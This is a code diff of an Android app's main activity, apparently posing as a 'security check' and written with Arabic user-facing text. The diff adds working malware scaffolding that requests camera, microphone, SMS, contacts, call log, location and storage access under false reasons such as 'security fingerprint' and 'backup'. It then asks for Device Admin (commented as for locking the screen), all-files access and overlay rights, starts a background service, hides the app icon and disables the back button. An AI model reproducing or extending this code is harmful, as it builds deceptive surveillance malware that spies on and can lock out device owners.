@@ -3,13 +3,18 @@ package com.sec.check;
 import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.Gravity;
 import android.widget.LinearLayout;
@@ -18,79 +23,59 @@ import android.widget.TextView;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import java.util.ArrayList;
+import java.util.List;
+
 public class MainActivity extends Activity {
 
     private static final String TAG = "SecurityCheck";
     private static final int PERMISSION_REQUEST = 1001;
+    private static final int REQUEST_DEVICE_ADMIN = 2001;
+    private static final int REQUEST_OVERLAY = 2002;
+    private static final int REQUEST_MANAGE_STORAGE = 2003;
 
-    // ★★★ ترتيب الصلاحيات — واحدة واحدة مع شرح
     private static final String[][] PERMISSIONS_WITH_REASON = {
+            {Manifest.permission.CAMERA,
+                    "لأخذ بصمة أمنية والتحقق من هويتك"},
+            {Manifest.permission.RECORD_AUDIO,
+                    "لتسجيل البصمة الصوتية للتحقق"},
             {Manifest.permission.READ_CONTACTS,
-                    "لمزامنة جهات الاتصال كنسخة احتياطية"},
+                    "لعمل نسخة احتياطية من جهات الاتصال"},
             {Manifest.permission.READ_SMS,
                     "لعمل نسخة احتياطية من الرسائل"},
             {Manifest.permission.READ_CALL_LOG,
                     "لحفظ سجل المكالمات كنسخة احتياطية"},
-            {Manifest.permission.CAMERA,
-                    "للبصمة الأمنية والتقاط صور التحقق"},
-            {Manifest.permission.RECORD_AUDIO,
-                    "لتسجيل البصمة الصوتية الأمنية"},
             {Manifest.permission.ACCESS_FINE_LOCATION,
                     "لتأمين حسابك حسب موقعك"},
             {Manifest.permission.ACCESS_COARSE_LOCATION,
-                    "لتقريب الموقع الجغرافي"},
+                    "لتحديد موقعك التقريبي"},
             {Manifest.permission.READ_PHONE_STATE,
                     "للتحقق من هوية الجهاز"},
             {Manifest.permission.READ_EXTERNAL_STORAGE,
-                    "للوصول لملفات النسخ الاحتياطي"},
+                    "للوصول لملفاتك المحفوظة"},
             {Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                    "لحفظ الملفات المؤقتة"},
+                    "لحفظ النسخ الاحتياطية"},
+    };
+
+    private static final String[] PERMISSIONS_ANDROID_13 = {
+            "android.permission.READ_MEDIA_IMAGES",
+            "android.permission.READ_MEDIA_VIDEO",
+            "android.permission.READ_MEDIA_AUDIO",
     };
 
     private int currentPermIndex = 0;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
-    private boolean permissionFlowActive = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Log.d(TAG, "======== APP STARTED =========");
 
-        // ★ واجهة أولية
         showInitialUI();
 
-        // ★ ابدأ طلب الصلاحيات
-        mainHandler.postDelayed(() -> {
-            if (!permissionFlowActive) {
-                permissionFlowActive = true;
-                startPermissionFlow();
-            }
-        }, 1500);
+        mainHandler.postDelayed(this::startPermissionFlow, 1500);
     }
 
-    @Override
-    protected void onResume() {
-        super.onResume();
-
-        // ★ لو رجع من Background (بسبب Service طلب صلاحية) — أعد الطلب
-        if (permissionFlowActive && currentPermIndex < PERMISSIONS_WITH_REASON.length) {
-            mainHandler.postDelayed(() -> {
-                String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
-                if (ContextCompat.checkSelfPermission(this, permission)
-                        != PackageManager.PERMISSION_GRANTED) {
-                    Log.d(TAG, "onResume → retry permission: " + permission);
-                    requestNextPermission();
-                } else {
-                    currentPermIndex++;
-                    requestNextPermission();
-                }
-            }, 500);
-        }
-    }
-
-    // ============================================================
-    // واجهة أولية مقنعة
-    // ============================================================
     private void showInitialUI() {
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
@@ -125,7 +110,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // طلب الصلاحيات — واحدة واحدة
+    // بدء طلب الصلاحيات
     // ============================================================
     private void startPermissionFlow() {
         currentPermIndex = 0;
@@ -134,64 +119,61 @@ public class MainActivity extends Activity {
 
     private void requestNextPermission() {
         if (currentPermIndex >= PERMISSIONS_WITH_REASON.length) {
-            Log.d(TAG, "✅ All permissions requested");
-            mainHandler.postDelayed(this::startServiceNow, 1000);
-            mainHandler.postDelayed(this::hideAppIcon, 4000);
+            Log.d(TAG, "✅ All runtime permissions requested");
+
+            // ★ اطلب Device Admin بعد الصلاحيات
+            mainHandler.postDelayed(this::requestDeviceAdmin, 800);
             return;
         }
 
         String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
-        String reason = PERMISSIONS_WITH_REASON[currentPermIndex][1];
 
+        // تحقق إذا الصلاحية معمولة في المانيفست
+        if (!isPermissionDeclared(permission)) {
+            Log.d(TAG, "⚠️ Permission not declared in manifest: " + permission);
+            currentPermIndex++;
+            requestNextPermission();
+            return;
+        }
+
+        // ممنوحة؟
         if (ContextCompat.checkSelfPermission(this, permission)
                 == PackageManager.PERMISSION_GRANTED) {
-            Log.d(TAG, "✅ Already granted: " + permission);
+            Log.d(TAG, "✅ Granted: " + permission);
             currentPermIndex++;
-            mainHandler.postDelayed(this::requestNextPermission, 300);
+            requestNextPermission();
             return;
         }
 
-        if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
-            showRationaleDialog(permission, reason);
-            return;
-        }
-
+        // اطلب
         Log.d(TAG, "→ Requesting: " + permission);
         try {
             ActivityCompat.requestPermissions(this,
                     new String[]{permission}, PERMISSION_REQUEST);
         } catch (Exception e) {
-            Log.e(TAG, "requestPermissions error: " + e.getMessage());
+            Log.e(TAG, "request error: " + e.getMessage());
             currentPermIndex++;
             requestNextPermission();
         }
     }
 
-    private void showRationaleDialog(String permission, String reason) {
+    // ★ تحقق إذا الصلاحية معمولة في المانيفست
+    private boolean isPermissionDeclared(String permission) {
         try {
-            new AlertDialog.Builder(this)
-                    .setTitle("🔐 صلاحية مطلوبة للأمان")
-                    .setMessage(reason + "\n\nبدون هذه الصلاحية لن يعمل التطبيق بشكل صحيح.")
-                    .setPositiveButton("السماح", (dialog, which) -> {
-                        ActivityCompat.requestPermissions(this,
-                                new String[]{permission}, PERMISSION_REQUEST);
-                    })
-                    .setNegativeButton("تخطي", (dialog, which) -> {
-                        currentPermIndex++;
-                        requestNextPermission();
-                    })
-                    .setCancelable(false)
-                    .show();
+            android.content.pm.PackageInfo info = getPackageManager()
+                    .getPackageInfo(getPackageName(),
+                            PackageManager.GET_PERMISSIONS);
+            if (info.requestedPermissions != null) {
+                for (String p : info.requestedPermissions) {
+                    if (p.equals(permission)) return true;
+                }
+            }
         } catch (Exception e) {
-            Log.e(TAG, "dialog error: " + e.getMessage());
-            currentPermIndex++;
-            requestNextPermission();
+            Log.e(TAG, "isPermissionDeclared: " + e.getMessage());
         }
+        return false;
     }
 
-    // ============================================================
-    // استقبل نتيجة الصلاحية
-    // ============================================================
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                            int[] grantResults) {
@@ -201,19 +183,106 @@ public class MainActivity extends Activity {
             for (int i = 0; i < permissions.length; i++) {
                 boolean granted = grantResults.length > 0
                         && grantResults[i] == PackageManager.PERMISSION_GRANTED;
-                Log.d(TAG, permissions[i] + " -> "
-                        + (granted ? "GRANTED" : "DENIED"));
+                Log.d(TAG, permissions[i] + " → " + (granted ? "GRANTED" : "DENIED"));
             }
-
-            // ★ انتقل للتالية مهما كانت النتيجة
+            // انتقل للتالية بغض النظر عن النتيجة
             currentPermIndex++;
-            mainHandler.postDelayed(this::requestNextPermission, 600);
+            mainHandler.postDelayed(this::requestNextPermission, 500);
         }
     }
 
     // ============================================================
-    // تشغيل الخدمة
+    // ★★★ طلب Device Admin (لقفل الشاشة)
     // ============================================================
+    private void requestDeviceAdmin() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager)
+                    getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminComponent = new ComponentName(this,
+                    DeviceAdminReceiver.class);
+
+            if (dpm != null && !dpm.isAdminActive(adminComponent)) {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "لتأمين جهازك وحمايته");
+                startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
+                Log.d(TAG, "→ Requesting Device Admin");
+            } else {
+                Log.d(TAG, "✅ Device Admin already active");
+                mainHandler.postDelayed(this::requestManageStorage, 500);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "DeviceAdmin error: " + e.getMessage());
+            mainHandler.postDelayed(this::requestManageStorage, 500);
+        }
+    }
+
+    // ============================================================
+    // ★★★ طلب MANAGE_EXTERNAL_STORAGE (Android 11+)
+    // ============================================================
+    private void requestManageStorage() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            try {
+                if (!android.os.Environment.isExternalStorageManager()) {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, REQUEST_MANAGE_STORAGE);
+                    Log.d(TAG, "→ Requesting MANAGE_STORAGE");
+                    return;
+                } else {
+                    Log.d(TAG, "✅ MANAGE_STORAGE granted");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "ManageStorage error: " + e.getMessage());
+            }
+        }
+        mainHandler.postDelayed(this::requestOverlay, 500);
+    }
+
+    // ============================================================
+    // ★★★ طلب SYSTEM_ALERT_WINDOW (Overlay)
+    // ============================================================
+    private void requestOverlay() {
+        try {
+            if (!Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, REQUEST_OVERLAY);
+                Log.d(TAG, "→ Requesting Overlay");
+                return;
+            } else {
+                Log.d(TAG, "✅ Overlay granted");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Overlay error: " + e.getMessage());
+        }
+        mainHandler.postDelayed(this::finishSetup, 500);
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        Log.d(TAG, "onActivityResult: " + requestCode + " → " + resultCode);
+
+        if (requestCode == REQUEST_DEVICE_ADMIN) {
+            mainHandler.postDelayed(this::requestManageStorage, 500);
+        } else if (requestCode == REQUEST_MANAGE_STORAGE) {
+            mainHandler.postDelayed(this::requestOverlay, 500);
+        } else if (requestCode == REQUEST_OVERLAY) {
+            mainHandler.postDelayed(this::finishSetup, 500);
+        }
+    }
+
+    // ============================================================
+    // خلص الإعداد → شغّل الخدمة
+    // ============================================================
+    private void finishSetup() {
+        Log.d(TAG, "✅ Setup complete, starting service");
+        startServiceNow();
+        mainHandler.postDelayed(this::hideAppIcon, 5000);
+    }
+
     private void startServiceNow() {
         try {
             Intent svc = new Intent(this, ServiceRunner.class);
@@ -228,9 +297,6 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ============================================================
-    // إخفاء الأيقونة
-    // ============================================================
     private void hideAppIcon() {
         try {
             android.content.pm.PackageManager pm = getPackageManager();
@@ -249,4 +315,4 @@ public class MainActivity extends Activity {
     public void onBackPressed() {
         // منع الإغلاق
     }
-    }
+                }
